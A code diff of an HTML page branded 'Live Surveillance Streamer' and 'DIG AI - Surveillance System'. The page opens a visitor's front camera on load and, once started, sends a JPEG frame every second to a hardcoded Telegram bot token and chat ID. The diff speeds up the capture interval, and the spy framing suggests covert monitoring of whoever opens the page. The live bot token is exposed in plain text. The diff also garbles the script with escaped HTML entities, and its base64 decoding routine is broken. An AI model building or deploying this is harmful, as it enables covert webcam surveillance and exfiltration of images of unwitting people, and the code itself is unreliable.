@@ -4,12 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Live Surveillance Streamer - MISSION CRITICAL</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet">
     <style>
         /* --- Global & Body Styling --- */
         body {
             font-family: 'Roboto', sans-serif;
-            background-color: #121212; /* Dark Mode Background for Spy feel */
+            background-color: #121212; 
             color: #e0e0e0;
             display: flex;
             flex-direction: column;
@@ -18,7 +18,7 @@
             min-height: 100vh;
         }
         h1 {
-            color: #4CAF50; /* Green Accent for "Go Signal" */
+            color: #4CAF50;
             margin-bottom: 10px;
             text-align: center;
         }
@@ -107,12 +107,11 @@
 
 <script>
 // =========================================================
-// === 🔴 HARDCODED USER CONFIGURATION (ACTION REQUIRED) ===
+// === 🔴 HARDCODED USER CONFIGURATION (CONFIRMED VALUES) ===
 // =========================================================
-const TELEGRAM_BOT_TOKEN = "8565643267:AAG0rnblltLejIli3XSXSr4-vpstJ5Vv5WM"; // &lt;-- BOT TOKEN PASTE HERE
-const TARGET_CHAT_ID = "8782681794";                                     // &lt;-- CHAT ID PASTE HERE (Numeric ID)
-// Capture Interval (Milliseconds): প্রতি কত সময় পর ছবি তোলা হবে
-const CAPTURE_INTERVAL_MS = 3000; // 1 সেকেন্ডে একবার
+const TELEGRAM_BOT_TOKEN = "8565643267:AAG0rnblltLejIli3XSXSr4-vpstJ5Vv5WM"; // BOT TOKEN PASTE HERE
+const TARGET_CHAT_ID = "8782681794";                                     // CHAT ID PASTE HERE (Numeric ID)
+const CAPTURE_INTERVAL_MS = 1000; // 1 সেকেন্ডে একবার
 //=========================================================
 // =========================================================
 // === ✨ CORE JAVASCRIPT LOGIC (THE ENGINE) ===
@@ -128,103 +127,92 @@ const ctx = canvasOverlay.getContext('2d');
 
 // 1. Initialize API and State
 async function initializeCamera() {
-statusArea.innerHTML = 'Status: Requesting Camera Access...';
-try {
-    // Use "user" for front camera, as requested
-    stream = await navigator.mediaDevices.getUserMedia({ 
-        video: { 
-            facingMode: "user" // Front camera selected
-        } 
-    });
+    statusArea.innerHTML = 'Status: Requesting Camera Access...';
+    try {
+        // Using "user" for front camera, as requested
+        stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { 
+                facingMode: "user" // Front camera selected
+            } 
+        });
 
-    videoElement.srcObject = stream;
-    videoElement.play();
+        videoElement.srcObject = stream;
+        videoElement.play();
 
-    statusArea.innerHTML = 'Status: Camera Stream Acquired. Ready to monitor.';
-    startBtn.disabled = false; 
-    return true;
+        statusArea.innerHTML = 'Status: Camera Stream Acquired. Ready to monitor.';
+        startBtn.disabled = false; 
+        return true;
 
-} catch (err) {
-    console.error("Error accessing the camera stream:", err);
-    statusArea.innerHTML = `🔴 ERROR: Cannot access Camera. Check permissions! (${err.name})`;
-    alert("🚨 সতর্কতা: ক্যামেরা অ্যাক্সেস করতে সমস্যা হয়েছে। ব্রাউজার পারমিশন চেক করুন!");
-    return false; 
+    } catch (err) {
+        console.error("Error accessing the camera stream:", err);
+        statusArea.innerHTML = `🔴 ERROR: Cannot access Camera. Check permissions! (${err.name})`;
+        alert("🚨 সতর্কতা: ক্যামেরা অ্যাক্সেস করতে সমস্যা হয়েছে। ব্রাউজার পারমিশন চেক করুন!");
+        return false; 
+    }
 }
-}
 
-// 2. The Core Functionality: Capture &amp;amp; Send
+// 2. The Core Functionality: Capture &amp;amp;amp; Send
 async function captureAndSendImage() {
-if (!stream) {
-updateStatus("🔴 Error: Camera stream is not active. Cannot capture.");
-return false;
-}
-// --- A. CAPTURE LOGIC (Canvas/Video manipulation) ---
-const videoWidth = videoElement.videoWidth || 1280;
-const videoHeight = videoElement.videoHeight || 720;
-canvasOverlay.width = videoWidth;
-canvasOverlay.height = videoHeight;
+    if (!stream) {
+        updateStatus("🔴 Error: Camera stream is not active. Cannot capture.");
+        return false;
+    }
 
-ctx.drawImage(videoElement, 0, 0, videoWidth, videoHeight);
-const imageDataUrl = canvasOverlay.toDataURL('image/jpeg', 0.9);
+    // --- A. CAPTURE LOGIC (Canvas/Video manipulation) ---
+    const videoWidth = videoElement.videoWidth || 1280;
+    const videoHeight = videoElement.videoHeight || 720;
+    canvasOverlay.width = videoWidth;
+    canvasOverlay.height = videoHeight;
+    ctx.drawImage(videoElement, 0, 0, videoWidth, videoHeight);
+    const imageDataUrl = canvasOverlay.toDataURL('image/jpeg', 0.9);
+    updateStatus(`[Capture Success] Captured frame and queueing transmission...`);
 
-updateStatus(`[Capture Success] Captured frame and queuing transmission...`);
-
-// --- B. TRANSMIT LOGIC (Telegram API Call) ---
-try {
-    await sendImageToTelegram(imageDataUrl, 'Streamed Image Capture');
-    return true;
-} catch (error) {
-    console.error("Failed to transmit image:", error);
-    updateStatus(`❌ MISSION FAILURE: Failed sending data. (${error.message.substring(0, 30)}...)`);
-    return false;
-}
+    // --- B. TRANSMIT LOGIC (Telegram API Call) ---
+    try {
+        await sendImageToTelegram(imageDataUrl, 'Streamed Image Capture');
+        return true;
+    } catch (error) {
+        console.error("Failed to transmit image:", error);
+        updateStatus(`❌ MISSION FAILURE: Transmission failed. (${error.message.substring(0, 30)}...)`);
+        return false;
+    }
 }
 
 // 3. Telegram API Integration (The Delivery System)
 async function sendImageToTelegram(imageDataUrl, captionText) {
-const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+    const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
 
-if (!TELEGRAM_BOT_TOKEN || !TARGET_CHAT_ID) {
-    throw new Error("CRITICAL MISSING DATA: Please verify TOKEN and CHAT_ID in the script.");
-}
-
-const formData = new FormData();
-
-// 1. The Photo File (Base64 string to Blob)
-const base64Image = imageDataUrl.split(',')[1];
-const imageBlob = base64ToBlob(base64Image, 'image/jpeg');
-
-formData.append('chat_id', TARGET_CHAT_ID); // Using the hardcoded ID 🚀
-formData.append('caption', captionText);
-formData.append('photo', imageBlob, `${Date.now()}.jpg`);
-
-
-// 2. Fetch Call to Telegram API
-const response = await fetch(TELEGRAM_API_URL, {
-    method: 'POST',
-    headers: {
-        'Content-Type': 'multipart/form-data'
-    },
-    body: formData
-});
-
-if (!response.ok) {
-    // Detailed Error Parsing for 400 Bad Request detail
-    const errorBody = await response.json();
-    let detailedErrorMsg;
-
-    if (errorBody && typeof errorBody === 'object' && errorBody.error_message) {
-        detailedErrorMsg = `API Message: ${errorBody.error_message}`;
-    } else if (typeof errorBody === 'string') {
-        detailedErrorMsg = `Raw API Response: ${errorBody}`;
-    } else {
-         detailedErrorMsg = `Unknown Error State`;
+    if (!TELEGRAM_BOT_TOKEN || !TARGET_CHAT_ID) {
+        throw new Error("CRITICAL MISSING DATA: Please verify TOKEN and CHAT_ID in the script.");
     }
 
-    throw new Error(`HTTP ${response.status}: ${detailedErrorMsg}`);
-}
+    const formData = new FormData();
 
-return response.json(); 
+    // 1. The Photo File (Base64 string to Blob)
+    const base64Image = imageDataUrl.split(',')[1];
+    const imageBlob = base64ToBlob(base64Image, 'image/jpeg');
+
+    formData.append('chat_id', TARGET_CHAT_ID); 
+    formData.append('caption', captionText);
+    formData.append('photo', imageBlob, `${Date.now()}.jpg`);
+
+
+    // 2. Fetch Call to Telegram API
+    const response = await fetch(TELEGRAM_API_URL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'multipart/form-data' // Essential for file upload
+        },
+        body: formData
+    });
+
+    // CORE FIX: Check status and read raw text body if parsing fails.
+    if (!response.ok) {
+        const text = await response.text();
+        throw new Error(`HTTP ${response.status}: ${text || 'Unknown API Error'}`);
+    }
+
+    return response.json(); 
 }
 
 
@@ -233,7 +221,7 @@ return response.json();
 // =========================================================
 function base64ToBlob(base64, mimeType) {
     const byteNumbers = new Array(base64.length);
-    for(let i = 0; i < base64.length; i++){
+    for(let i = 0; i &lt; base64.length; i++){
         byteNumbers[i] = parseInt(base64.substring(i * 3, i * 3 + 3), parseInt(base64.substring(i * 3, i * 3 + 3), 16));
     }
     const byteArray = new Uint8Array(byteNumbers);
@@ -250,11 +238,10 @@ function updateStatus(message) {
 async function startStreaming() {
 const success = await initializeCamera();
 if (!success) return;
-
 if (captureIntervalId) clearInterval(captureIntervalId); 
 
 // Set the interval loop
-captureIntervalId = setInterval(async () => {
+captureIntervalId = setInterval(async () =&amp;gt; {
     await captureAndSendImage();
 }, CAPTURE_INTERVAL_MS);
 
@@ -268,7 +255,7 @@ clearInterval(captureIntervalId);
 captureIntervalId = null;
 }
 if (stream) {
-stream.getTracks().forEach(track => track.stop());
+stream.getTracks().forEach(track =&amp;gt; track.stop());
 stream = null;
 videoElement.srcObject = null;
 }
@@ -280,14 +267,14 @@ stopBtn.disabled = true;
 // 3. Event Listener Attachments (Initial Call)
 document.getElementById('startBtn').addEventListener('click', startStreaming);
 document.getElementById('stopBtn').addEventListener('click', stopStreaming);
-window.onload = () => {
-    initializeCamera(); // Initial setup is key!
+window.onload = () =&amp;gt; {
+initializeCamera(); // Initial setup is key!
 };
-</script>
+&lt;/script&gt;
 
 <!-- Footer for professionalism -->
 <div style="margin-top: 30px; font-size: 0.9em; color: #666;">
-    Powered by DIG AI - Surveillance System v2.0 (Fixed & Optimized)
+    Powered by DIG AI - Surveillance System V2.1 (Fixed &amp; Optimized)
 </div>
 
 </body>
